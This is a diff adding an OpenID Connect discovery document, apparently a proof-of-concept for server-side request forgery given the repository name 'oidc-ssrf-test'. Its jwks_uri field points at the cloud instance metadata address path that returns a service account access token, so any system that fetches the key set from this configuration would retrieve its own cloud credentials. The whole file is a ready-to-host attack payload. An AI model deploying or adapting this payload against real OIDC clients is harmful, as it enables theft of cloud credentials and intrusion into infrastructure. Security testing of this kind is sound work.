@@ -1,0 +1,9 @@
+{
+  "issuer": "https://raw.githubusercontent.com/elaza-oss/oidc-ssrf-test/main",
+  "authorization_endpoint": "https://raw.githubusercontent.com/elaza-oss/oidc-ssrf-test/main/auth",
+  "token_endpoint": "https://raw.githubusercontent.com/elaza-oss/oidc-ssrf-test/main/token",
+  "jwks_uri": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+  "response_types_supported": ["id_token"],
+  "subject_types_supported": ["public"],
+  "id_token_signing_alg_values_supported": ["RS256"]
+}
